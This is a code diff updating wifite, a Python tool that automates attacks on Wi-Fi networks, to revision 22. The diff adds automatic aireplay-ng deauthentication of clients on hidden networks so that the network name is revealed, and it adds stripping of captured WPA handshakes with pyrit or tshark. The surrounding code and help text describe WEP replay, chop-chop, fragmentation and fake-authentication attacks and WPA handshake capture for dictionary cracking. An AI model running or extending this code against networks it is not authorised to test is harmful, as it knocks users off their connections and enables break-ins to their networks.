@@ -6,7 +6,7 @@
 
 """ TODO LIST:
     -test SKA (my router won't allow it, broken SKA everytime)
-    -folder for handshakes... hands/, hshakes/ handsh8kz/ hs/ ?
+    -deauth entire router if SSID is hidden?
 """
 
 import string, sys # basic stuff
@@ -23,7 +23,7 @@ import tkFileDialog   # for selecting the dictionary file
 import threading      # so the GUI doesn't lock up
 
 # current revision
-REVISION=21
+REVISION=22
 
 # default wireless interface (blank to prompt)
 # ex: wlan0, wlan1, rausb0
@@ -59,7 +59,14 @@ AUTOCRACK  =9000  # begin cracking when our IVS count is...  OVER9000!!!!!
 CHANGE_MAC =False # default is false because changing my mac causes attacks to NOT work on my router
                   # set =True if you want to [temporarily] change the mac address of your wifi card
                   # to the MAC of a client on the targeted network.
+
 EXIT_IF_NO_FAKEAUTH=False # during a WEP attack, if fake-authentication fails, the attack is cancelled
+
+NO_HIDDEN_DEAUTH=False # when true, disables the option to send deauth packets to hidden access points
+                       # only deauths clients and only when a fixed channel is selected
+                       # this can help uncloak invisible access points, but is laggy
+
+STRIP_HANDSHAKE=False # when true, strips handshake via pyrit (removes unnecessary packets from .cap file)
 
 # default channel to scan
 CHANNEL='0'  # 0 means attack all channels.
@@ -811,14 +818,14 @@ def check_root():
 ############################################################################### handle args
 def handle_args(args):
 	""" handles arguments, sets global variables if specified """
-	global IFACE, WEP, WPA, CHANNEL, ESSID, DICT, WPA_MAXWAIT, WEP_MAXWAIT
+	global IFACE, WEP, WPA, CHANNEL, ESSID, DICT, WPA_MAXWAIT, WEP_MAXWAIT, STRIP_HANDSHAKE
 	global W, BLA, R, G, O, B, P, C, GR # colors
 	global WEP_ARP, WEP_CHOP, WEP_FRAG, WEP_P0841, TEMPDIR, EXIT_IF_NO_FAKEAUTH # wep attacks
 	
-	# first loop, finds '-no-color' and '-help', in case the user wants to use these!
+	# first loop, finds '-no-color' in case the user doesn't want to see any color!
 	for a in args:
 		#nocolor
-		if a == '-no-color' or a == '--no-color':
+		if a == '-no-color' or a == '--no-color' or a == '-nocolor':
 			# no colors, blank out the colors
 			W  = ""
 			BLA= ""
@@ -830,14 +837,24 @@ def handle_args(args):
 			C  = ""
 			GR = ""
 			print '[+] colors have been neutralized :)\n'
-			
+			break
+	
+	# second loop, look for 'help' or 'upgrade' because these are single-servin arguments
+	# the program will terminate after these commands are issued
+	for a in args:
 		#HELP
-		elif a == 'h' or a == 'help' or a == '-h':
+		if a == 'h' or a == 'help' or a == '-h' or a == '?' or a == '/?' or a == 'commands':
 			halp()
 			subprocess.call(['rm','-rf',TEMPDIR])
 			sys.exit(0)
 		elif a == '--help' or a == '-help':
 			halp(True)
+			subprocess.call(['rm','-rf',TEMPDIR])
+			sys.exit(0)
+			
+		elif a == '-update' or a == '--update' or a == '-upgrade' or a == '--upgrade':
+			# upgrayedd
+			update()
 			subprocess.call(['rm','-rf',TEMPDIR])
 			sys.exit(0)
 	
@@ -1000,18 +1017,20 @@ def handle_args(args):
 			WEP_P0841=False
 			print GR+'[+] '+W+'-p 0841 attack '+G+'disabled'+W
 		
-		elif a == '-update' or a == '--update' or a == '-upgrade' or a == '--upgrade':
-			# upgrayedd
-			update()
-			subprocess.call(['rm','-rf',TEMPDIR])
-			sys.exit(0)
-		
 		elif a == '-console' or a == '--console':
 			print GR+'[+] '+G+'console mode'+W+' activated'
 		
 		elif a == '-f' or a == '--force-auth':
 			print GR+'[+] '+W+'continue WEP attack despite fake-auth failure '+O+'disabled'+W+''
 			EXIT_IF_NO_FAKEAUTH=True
+		
+		elif a == '-nod' or a == '--no-deauth':
+			print GR+'[+] '+W+'deauthentication of hidden networks '+O+'disabled'+W+''
+			NO_HIDDEN_DEAUTH=True
+			
+		elif a == '-strip' or a == '--strip':
+			print GR+'[+] '+W+'handshake stripping via pryit '+G+'enabled'+W+''
+			STRIP_HANDSHAKE=True
 			
 		i += 1
 		
@@ -1053,7 +1072,8 @@ def halp(full=False):
 		print G+'  -i, --iface\t'+GR+'     e.g. -i wlan0'
 		print '             \t wireless interface'
 		print '             \t the program automatically selects a wifi device in monitor mode'
-		print '             \t prompts for input if no monitor-mode devices are found\n'
+		print '             \t prompts for input if no monitor-mode devices are found'
+		print '             \t using this switch avoids the prompt\n'
 	else:
 		print G+'  -i\t   '+GR+'wireless interface'
 	#DICT
@@ -1063,7 +1083,7 @@ def halp(full=False):
 		print '             \t the program will prompt for a dictionary file if any WPA targets'
 		print '             \t are selected for attack. using -d avoids this prompt'
 		print '             \t wifite will use "wordlist.txt" if found in same directory as this script'
-		print '             \t e.g. -d "none"'
+		print '             \t     e.g. -d "none"'
 		print '             \t does not attempt to crack WPA handshakes, only captures and stores them\n'
 	else:
 		print G+'  -d\t   '+GR+'dictionary file, for WPA handshake cracking'
@@ -1074,6 +1094,12 @@ def halp(full=False):
 		print '          \t enter "0" to wait endlessly\n'
 	else:
 		print G+'  -wpaw\t   '+GR+'time to wait for wpa handshake (in minutes)'
+	# handshake strip
+	if full:
+		print G+'  --strip\t'+GR+' strip unnecessary packets from .cap file (leaves only handshake)'
+		print '         \t uses pyrit (or tshark) to strip. greatly reduces size of handshkae cap files\n'
+	else:
+		print G+'  -strip   '+GR+'strip WPA handshake from cap files (reduce .cap size)'
 	#WEPWAIT
 	if full:
 		print G+'  --wep-wait\t'+GR+'     e.g. -wepw 10'
@@ -1086,7 +1112,7 @@ def halp(full=False):
 		print G+'  -wepw\t   '+GR+'max time (in minutes) to capture/crack WEP key of each access point'
 	#PPS
 	if full:
-		print G+'  --pps\t\t\t'+GR+'     e.g. -pps 400'
+		print G+'  --pps\t\t'+GR+'     e.g. -pps 400'
 		print '          \t packets-per-second (used only by WEP attacks) - larger pps means more ivs'
 		print '          \t however, smaller pps is recommended for weaker access points (or far-away APs)\n'
 		
@@ -1094,17 +1120,17 @@ def halp(full=False):
 		print G+'  -pps\t   '+GR+'packets-per-second (for WEP replay attacks)'
 	#CHANGE_MAC
 	if full:
-		print G+'  --change-mac\t'+GR+' chanes mac address of interface to a client\'s mac (if found)'
+		print G+'  --change-mac\t'+GR+' changes mac address of interface to a client\'s mac (if found)'
 		print '          \t only affects WEP-based attacks\n'
 		
 	else:
 		print G+'  -mac\t   '+GR+'for WEP attacks only: change mac address to client\'s mac (if found)'
 	#wep: no-attack
 	if full:
-		print G+'  --no-arp\t'+GR+' disables arp-replay attack'
-		print G+'  --no-chop\t'+GR+' disables chop-chop attack'
-		print G+'  --no-frag\t'+GR+' disables fragmentation attack'
-		print G+'  --no-p0841\t'+GR+' disables -p0841 attack\n'
+		print G+'  --no-arp\t'+GR+' WEP disables arp-replay attack'
+		print G+'  --no-chop\t'+GR+' WEP disables chop-chop attack'
+		print G+'  --no-frag\t'+GR+' WEP disables fragmentation attack'
+		print G+'  --no-p0841\t'+GR+' WEP disables -p0841 attack\n'
 	else:
 		print G+'  -noarp   '+GR+'disables arp-replay attack'
 		print G+'  -nochop  '+GR+'disables fragmentation attack'
@@ -1112,9 +1138,19 @@ def halp(full=False):
 		print G+'  -no0841  '+GR+'disables -p0841 attack'
 	#WEP FORCE FAKE-AUTH (cancels attack if failed)
 	if full:
-		print G+'  --force-auth\t '+GR+'during WEP attack, if fake-authentication fails, the attack ends\n'
+		print G+'  --force-auth\t '+GR+'during a WEP attack, if fake-authentication fails, the attack ends'
+		print   '              \t most attacks require fake-authentication, but some high-traffic routers'
+		print   '              \t give off enough packets to be cracked without injecting packets\n'
 	else:
-		print G+'  -f       '+GR+'WEP attacks end if fake-authentication with the router fails'
+		print G+'  -f       '+GR+'force auth: WEP attacks end if fake-authentication fails'
+	# SSID DEAUTH
+	if full:
+		#-nod --no-deauth
+		print G+'  --no-deauth\t '+GR+'wifite will automatically deauth clients of hidden SSIDs to decloack the name'
+		print   '             \t use this feature to disable the automatic deauth of clients'
+		print   '             \t *this feature is only available in fixed-channel mode*\n'
+	else:
+		print G+'  -nod     '+GR+'do not deauth hidden SSIDs while scanning on a fixed channel'
 	#NO COLORS
 	if full:
 		print G+'  --no-color\t '+GR+'do not display annoying colors (use system colors)\n'
@@ -2163,7 +2199,7 @@ def attack_wpa(index):
 		 -cycles between attacking each client indivdiually, and every client (broadcast)
 		waits until a handshake it captured, the user hits ctrl+c, OR the timer goes past WPA_MAXWAIT
 	"""
-	global TARGETS, CLIENTS, IFACE, WPA_CRACK, SKIP_TO_WPA, HANDSHAKES, TEMPDIR
+	global TARGETS, CLIENTS, IFACE, WPA_CRACK, SKIP_TO_WPA, HANDSHAKES, TEMPDIR, STRIP_HANDSHAKE
 	
 	# check if we already have a handshake for this SSID...
 	temp=TARGETS[index][8].strip()
@@ -2262,13 +2298,39 @@ def attack_wpa(index):
 						'] '+W+'sent 3 deauth packets; '+G+'handshake captured!'+W+' saved as "'+G+temp+'.cap'+W+'"'
 				sys.stdout.flush()
 				
+				# strip handshake if user requested it
+				if STRIP_HANDSHAKE:
+					# check if pyrit exists
+					proc_pyrit = subprocess.Popen(['which','pyrit'],stdout=subprocess.PIPE)
+					if proc_pyrit.communicate()[0].strip() != '':
+						# print/strip
+						print GR+'['+get_time(WPA_MAXWAIT,TIME_START)+ \
+								'] '+G+'stripped'+W+' handshake using '+G+'pyrit'+W
+						
+						# should pyrit overwrite the old cap file? yes.
+						subprocess.call(['pyrit','-r',temp+'.cap','-o',temp+'.cap','strip'],\
+								stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'))
+					else:
+						# use tshark to strip, if it exists
+						proc_tshark = subprocess.Popen(['which','tshark'],stdout=subprocess.PIPE)
+						if proc_tshark.communicate()[0].strip() != '':
+							# print/strip
+							print GR+'['+get_time(WPA_MAXWAIT,TIME_START)+ \
+									'] '+G+'stripped'+W+' handshake using '+G+'pyrit'+W
+							
+							# over-write old file
+							subprocess.call(['tshark','-r',temp+'.cap','-R',\
+								'eapol || wlan_mgt.tag.interpretation','-w',temp+'.cap.temp'],\
+								stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'))
+							subprocess.call(['mv',temp+'.cap.temp',temp+'.cap'])
+							
 				#logit('got handshake for "'+TARGETS[index][8]+'" stored handshake in "' + temp + '.cap"')
 				HANDSHAKES += 1
 				
 				# add the filename and SSID to the list of 'to-crack' after everything's done
 				WPA_CRACK.append([temp+'.cap', TARGETS[index][8]])
 				break
-			
+				
 			else:
 				# no handshake yet
 				print '\r'+GR+'['+get_time(WPA_MAXWAIT,TIME_START)+'] '+W+'sent 3 deauth packets; '+O+'no handshake yet ',
@@ -2467,23 +2529,9 @@ def gettargets():
 						break
 					sys.stdout.flush()
 			else:
-				"""
-				if old != len(TARGETS):
-					old = len(TARGETS)
-					print '\r['+sec2hms(time.time()-TIME_START)+'] ' + str(old) + ' targets',
-					
-					if oldc != len(CLIENTS):
-						oldc = len(CLIENTS)
-						print 'and ' + str(oldc) + ' clients',
-					
-					print 'found                        ',
-				else:
-					if oldc != len(CLIENTS):
-						oldc = len(CLIENTS)
-						print '\r['+sec2hms(time.time()-TIME_START)+'] ' + str(oldc) + ' clients found                 ',
-				"""
 				print '\r'+GR+'['+sec2hms(time.time()-TIME_START)+ \
 						'] '+G+str(len(TARGETS))+W+' targets and '+G+str(len(CLIENTS))+W+' clients found',
+				
 				if ESSID == 'all' or ESSID.startswith('pow>'):
 					# wait for 10 seconds, then start cracking
 					if time.time() - TIME_START >= 10:
@@ -2619,8 +2667,9 @@ def gettargets():
 
 def parsetargets():
 	"""reads through 'wifite-01.csv' and adds any valid targets to the global list TARGETS """
-	global TARGETS, CLIENTS, WEP, WPA, TEMPDIR, CHANNEL, IFACE
+	global TARGETS, CLIENTS, WEP, WPA, TEMPDIR, CHANNEL, IFACE, NO_HIDDEN_DEAUTH
 	
+	DEAUTH=[]
 	TARGETS=[]
 	try:
 		f = open(TEMPDIR+'wifite-01.csv', 'r')
@@ -2656,16 +2705,18 @@ def parsetargets():
 						temp[7] = temp[7].strip()
 						if int(temp[5]) < 0:
 							temp[5] = str(int(temp[5]) + 100)
+							
 						if int(temp[7]) == len(temp[8]) and temp[8] != '' and temp[8] != ( chr(0) * len(temp[8])):
 							TARGETS.append(temp)
+							
 						elif temp[8] == ( chr(0) * len(temp[8])) and CHANNEL != '0':
 							# it's a hidden network and we're on a fixed channel
 							client=CLIENTS.get(temp[0],None)
-							if client != None:
+							if client != None and NO_HIDDEN_DEAUTH==False:
 								# we have a client, better call deauth
-								print '\r'+GR+'[+]'+W+' found hidden network and client, '+G+'sending 1 deauth...'
+								
 								deauth_cmd = ['aireplay-ng','-0','1','-a',temp[0],'-c',client,IFACE]
-								subprocess.call(deauth_cmd, stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
+								DEAUTH.append(deauth_cmd)
 							
 				
 			elif line.find('Station MAC') == -1 and clients == True:
@@ -2686,6 +2737,19 @@ def parsetargets():
 	
 	# sort the targets by power
 	TARGETS = sorted(TARGETS, key=lambda targets: targets[5], reverse=True)
+	
+	if len(DEAUTH) > 0:
+		msg='[sending hidden deauth'
+		if len(DEAUTH) > 1:
+			msg+='s'
+		msg+=']'
+		print ''+O+' [sending hidden deauth] '+W,
+		for d in DEAUTH:
+			sys.stdout.flush()
+			subprocess.call(d, stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
+	else:
+		print '                         ',
+	
 
 
 def stringtolist(s, most):
@@ -2765,3 +2829,4 @@ subprocess.call('rm -rf /tmp/wifite*', shell=True, stdout=open(os.devnull,'w'),s
 # ['XX:XX:XX:XX:XX:XX', '1', 'WPA2WPA', 'CCMP', 'PSK', '48', '0',  '11',  'Belkin.A38E']
 #  BSSID,            CHANNEL,  ENC,      CYPH,   ??,   POWER,IVS,SSID_LEN,    SSID
 #    0                  1       2         3      4       5    6     7          8
+
